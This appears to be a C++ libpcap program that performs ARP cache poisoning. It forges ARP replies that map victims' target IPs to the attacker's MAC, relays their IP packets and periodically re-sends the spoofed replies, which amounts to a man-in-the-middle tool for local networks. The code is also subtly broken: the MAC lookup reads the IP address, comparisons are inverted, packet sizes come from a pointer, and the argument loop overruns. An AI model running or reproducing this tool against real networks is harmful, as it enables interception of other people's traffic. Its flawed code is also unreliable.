#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>           // close()
#include <string.h>           // strcpy, memset()
#include <net/if.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <netinet/ip.h>       // IP_MAXPACKET (65535)
#include <netinet/ether.h>
#include <sys/types.h>        // needed for socket(), uint8_t, uint16_t
#include <sys/socket.h>       // needed for socket()
#include <linux/if_ether.h>   // ETH_P_ARP = 0x0806, ETH_P_ALL = 0x0003
#include <net/ethernet.h>
#include <pcap.h>
#include <errno.h>
#include <time.h>   
#include <vector>

using namespace std;

struct arp_hdr {
	uint16_t htype = ntohs(0x0001);
	uint16_t ptype = ntohs(0x0800);
	uint8_t hlen = 6;
	uint8_t plen = 4;
	uint16_t opcode;
	uint8_t sender_mac[6];
	uint8_t sender_ip[4];
	uint8_t target_mac[6];
	uint8_t target_ip[4];
};

struct ether_hdr {
	uint8_t dest_mac[6];
	uint8_t src_mac[6];
	uint16_t type = ntohs(0x0806);
	struct arp_hdr arp;
};

struct Ma {
	uint8_t maddr[6];
};


struct I {
	uint8_t iaddr[4];
};


void get_my_ip(uint8_t * my_ip, char * interface) {
	struct ifreq ifr;
	char ipstr[40];
	int s;

	s = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, interface, IFNAMSIZ);

	if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
		printf("Error");
	}
	else {
		//inet_ntop(AF_INET, ifr.ifr_addr.sa_data + 2, ipstr, sizeof(struct sockaddr));
		memcpy(my_ip, ifr.ifr_addr.sa_data + 2, 4);
	}
}

void get_my_mac(uint8_t * my_mac, char * interface) {
	struct ifreq ifr;
	char ipstr[40];
	int s;

	s = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, interface, IFNAMSIZ);

	if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
		printf("Error");
	}
	else {
		memcpy(my_mac, ifr.ifr_addr.sa_data, 6);
	}
}

void arp_request(uint8_t* sender_mac, uint8_t* sender_ip, uint8_t* my_mac, uint8_t* my_ip, uint8_t* target_mac, pcap_t* handle){
	struct ether_hdr eth;
	uint8_t size = sizeof(struct ether_hdr);
	uint8_t* header = (uint8_t *)malloc(size);
	memset(eth.dest_mac, 0xff, 6);
	memcpy(eth.src_mac, my_mac, 6);
	eth.arp.opcode = (uint16_t)(0x0001);
	memcpy(eth.arp.sender_mac, my_mac, 6);
	memcpy(eth.arp.sender_ip, my_ip, 4);
	memset(eth.arp.target_mac, 0x00, 6);
	memcpy(eth.arp.target_ip, sender_ip, 4);

	memcpy(header, &eth, size);
	pcap_sendpacket(handle, header, size);
	while (1) {
		struct pcap_pkthdr* header1;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header1, &packet);
		if (res == 0) continue;
		if (res == -1 || res == -2) break;
		if(ntohs(*((uint16_t*)(packet + 12)))==0x0806){
			memcpy(target_mac, packet + 22, 6);
			break;
		}
	}
}

void arp_send(uint8_t* sender_mac, uint8_t* sender_ip, uint8_t* my_mac, uint8_t* my_ip, uint8_t* target_mac, uint8_t* target_ip, pcap_t* handle) {
	struct ether_hdr eth;
	uint8_t size = sizeof(struct ether_hdr);
	uint8_t* header = (uint8_t *)malloc(size);
	memcpy(eth.dest_mac, target_mac, 6);
	memcpy(eth.src_mac, my_mac, 6);
	eth.arp.opcode = (uint16_t)(0x0002);
	memcpy(eth.arp.sender_mac, my_mac, 6);
	memcpy(eth.arp.sender_ip, target_ip, 4);
	memcpy(eth.arp.target_mac, sender_mac, 6);
	memcpy(eth.arp.target_ip, sender_ip, 4);

	memcpy(header, &eth, size);
	pcap_sendpacket(handle, header, size);
}



int main(int argc, char* argv[])
{	
	if ((argc % 2) == 1) {
		printf("error");
		return -1;
	}
	
	vector<I> senderip;
	vector<I> targetip;
	vector<Ma> sendermac;
	vector<Ma> targetmac;
	int t;
	char * interface = argv[1];
	
	uint8_t my_ip[4];
	uint8_t my_mac[6];
	I sender_ip;
	Ma sender_mac;
	I target_ip;
	Ma target_mac;
	

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
	get_my_ip(my_ip, interface);
	get_my_mac(my_mac, interface);

	for(t=0; t<argc; t+=2){
		uint32_t tmp = inet_addr(argv[t+2]);
		memcpy(sender_ip.iaddr, &tmp, 4);
		senderip.push_back(sender_ip);
		uint32_t tmp2 = inet_addr(argv[t+3]);
		memcpy(target_ip.iaddr, &tmp2, 4);
		targetip.push_back(target_ip);
		arp_request(sender_mac.maddr, sender_ip.iaddr, my_mac, my_ip, target_mac.maddr, handle);
		sendermac.push_back(sender_mac);
		targetmac.push_back(target_mac);
		arp_send(sender_mac.maddr, sender_ip.iaddr, my_mac, my_ip, target_mac.maddr, target_ip.iaddr, handle);
	}
	//senderip[0].addr
	double count=0;
	while(1){
		clock_t start, end; 
		int k;
		start = clock(); 

		struct pcap_pkthdr* header1;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header1, &packet);
		uint8_t size = sizeof(packet);
		if(ntohs(*((uint16_t*)(packet + 12)))==0x0800){
			for(k=0; k<(argc/2); k++){
				if(memcmp(packet + 6, sendermac[k].maddr, 6) && memcmp(packet + 30, targetip[k].iaddr, 4)){	//src_mac==sendermac && dstip==targetip
					uint8_t* packet1 = (uint8_t *)malloc(size);
					memcpy(packet1, &packet, size);
					memcpy(packet1 + 6, targetmac[k].maddr, 6); //dst_mac=target_mac			
					pcap_sendpacket(handle, packet , size);
				}
			}
		}
		else if(ntohs(*((uint16_t*)(packet + 12)))==0x0806){
			for(k=0; k<(argc/2); k++)
				if((ntohs(*((uint16_t*)(packet + 0)))==0xffffff)&&memcmp(packet + 38, targetip[k].iaddr, 4)){	//dst_mac=0xffffffff arp.targetip==targetip
					arp_send(sendermac[k].maddr, senderip[k].iaddr, my_mac, my_ip, targetmac[k].maddr, targetip[k].iaddr, handle);
				}
		}

		end = clock(); 
		count += (double)(end - start);
		if(count>5000){
			arp_send(sendermac[k].maddr, senderip[k].iaddr, my_mac, my_ip, targetmac[k].maddr, targetip[k].iaddr, handle);
			count += -5000;
		}
	}
	pcap_close(handle);

	return 0;
}
